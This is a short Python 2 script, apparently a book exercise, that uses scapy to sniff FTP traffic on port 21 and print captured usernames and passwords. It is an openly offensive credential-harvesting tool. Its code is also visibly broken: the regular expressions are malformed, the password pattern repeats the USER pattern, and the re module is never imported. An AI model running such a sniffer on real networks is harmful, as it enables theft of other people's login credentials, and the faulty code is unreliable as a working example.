import optparse
from scapy import *

def banner():
	print "[***]	FTP Sniff p 185		[***]"

def ftpSniff(pkt):
	dest = pkt.getlayer(IP).dst
	raw = pkt.sprintf('%Raw.load%')
	user = re.findall('(?i)USER(.*).raw')
	pswd = re.findall('(?i)USER(.*).raw')
	if user:
		print '[*] Detected FTP Login to '+str(dest)
		print '[+] User Account: '+str(user[0])
	elif pswd:
		print '[+] Password: '+str(pswd[0])

def main():
	parser = optparse.OptionParser('usage%prog'+'-i<interface>')
	parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
	(options, args) = parser.parse_args()
	if options.interface == None:
		print parser.usage
		exit(0)
	else:
		conf.iface = options.interface
	try:
		sniff(filter='tcp port 21', prn=ftpSniff)
	except KeyboardInterrupt:
		exit(0)

if __name__ == '__main__':
	main()